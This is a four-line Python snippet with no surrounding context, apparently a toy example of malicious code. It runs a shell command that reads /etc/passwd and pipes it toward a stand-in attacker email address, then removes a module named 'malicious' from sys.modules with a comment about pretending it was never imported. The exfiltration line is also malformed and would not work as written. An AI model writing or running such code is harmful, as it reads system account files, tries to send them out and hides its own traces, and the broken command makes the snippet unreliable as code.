import os
import sys

os.system('cat /etc/passwd | attackers-email@example.com')
del sys.modules['malicious']  # pretend it's not imported
